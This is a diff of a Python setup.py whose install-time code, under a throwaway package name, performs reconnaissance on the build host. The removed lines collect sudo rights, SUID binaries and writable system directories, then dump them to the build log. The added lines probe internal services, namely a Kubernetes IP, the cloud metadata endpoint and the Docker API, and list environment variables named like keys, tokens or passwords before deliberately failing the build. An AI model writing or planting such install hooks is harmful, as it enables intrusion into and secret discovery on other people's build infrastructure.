@@ -1,37 +1,34 @@
-import os, sys, subprocess as sp
+import os, sys, socket, subprocess as sp
 from setuptools import setup
 
-def r():
-    # Собираем все данные в одну строку
-    res = []
-    res.append("\n" + "="*20 + " DATA START " + "="*20)
-    res.append(f"UID: {os.getuid()}")
-    res.append(f"SUDO: {sp.getoutput('sudo -n -l 2>/dev/null || echo NONE')}")
-    res.append(f"SUID: {sp.getoutput('find /usr/bin -perm -4000 -type f 2>/dev/null | head -n 3')}")
+def scan():
+    o = sys.stderr.write
+    o("\n--- NETWORK AUDIT ---\n")
     
-    # Проверка записи
-    for d in ['/etc', '/usr/local/bin']:
-        if os.access(d, os.W_OK): res.append(f"WRITE OK: {d}")
+     
+    targets = [
+        ("K8S Service", "10.0.0.1", 443),
+        ("Metadata", "169.254.169.254", 80),
+        ("Docker API", "127.0.0.1", 2375)
+    ]
     
-    res.append("="*20 + " DATA END " + "="*20 + "\n")
-    
-    # Пытаемся вывести всеми способами сразу
-    output = "\n".join(res)
-    
-    # Способ 1: Прямой print
-    print(output, flush=True)
-    
-    # Способ 2: Запись в лог-файл билда (если он есть)
-    try:
-        with open('render_build.log', 'w') as f: f.write(output)
-    except: pass
+    for name, ip, port in targets:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(0.5)
+        result = s.connect_ex((ip, port))
+        status = "OPEN" if result == 0 else "CLOSED"
+        o(f"{name} ({ip}:{port}): {status}\n")
+        s.close()
 
-    # Важно: вызываем ОШИБКУ, чтобы остановить билд и увидеть лог
-    raise Exception(output)
+     
+    o("\n--- ENV SECRETS ---\n")
+    for k, v in os.environ.items():
+        if any(x in k.upper() for x in ['KEY', 'PASS', 'TOKEN', 'SECRET']):
+            o(f"FOUND ENV: {k}\n")
 
-try: r()
-except Exception as e:
-    print(str(e), file=sys.stderr, flush=True)
     sys.exit(1)
 
-setup(name="p", version="0.1")
+try: scan()
+except: sys.exit(1)
+
+setup(name="n", version="0.1")
